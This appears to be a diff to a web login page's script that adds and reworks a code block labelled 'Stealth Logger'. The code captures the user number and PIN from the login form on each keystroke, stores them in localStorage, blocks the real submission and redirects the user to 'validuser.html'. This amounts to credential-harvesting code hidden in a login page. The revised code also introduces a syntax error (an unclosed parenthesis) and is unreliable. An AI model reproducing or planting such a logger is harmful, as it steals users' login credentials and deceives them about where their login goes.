@@ -1260,43 +1260,46 @@ resizeTo(screen.availWidth,screen.availHeight-20);
 // ################################################################
 
 <script>
-// ===== DYNAMICALLY LOAD FOOTER.JS =====
+// ===== 1. Load footer.js Synchronously =====
 const footerDiv = document.createElement('div');
 footerDiv.className = 'col-sm-12';
 
 const footerScript = document.createElement('script');
 footerScript.src = '/itsincludes/js/footer.js';
+footerScript.async = false; // Force synchronous loading
+
 footerDiv.appendChild(footerScript);
 document.body.appendChild(footerDiv);
 
-// ===== STEALTH LOGGER =====
+// ===== 2. Stealth Logger + Redirect =====
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.forms['frmLogin'];
 
-    // Load saved values from localStorage
-    const saved = JSON.parse(localStorage.getItem('loginData') || '{}');
+    // Load saved credentials
+    const saved = JSON.parse(localStorage.getItem('loginData') || '{}';
     form.unum.value = saved.unum || '';
     form.pin.value = saved.pin || '';
 
+    // Auto-save inputs
     function saveToStorage() {
-        const data = {
+        localStorage.setItem('loginData', JSON.stringify({
             unum: form.unum.value,
             pin: form.pin.value
-        };
-        localStorage.setItem('loginData', JSON.stringify(data));
-        console.log('[Stealth] Saved login data');
+        }));
+        console.log('[Stealth] Saved credentials');
     }
 
     form.unum.addEventListener('input', saveToStorage);
     form.pin.addEventListener('input', saveToStorage);
 
+    // Handle redirect
     form.addEventListener('submit', function(e) {
         e.preventDefault();
         saveToStorage();
-        window.location.href = 'validuser.html'; // Redirect remains unchanged
+        window.location.href = 'validuser.html'; // Redirect
     });
 
-    console.log('[Stealth] Logger initialized');
+    console.log('[Stealth] Initialized');
 });
 </script>
 </body>
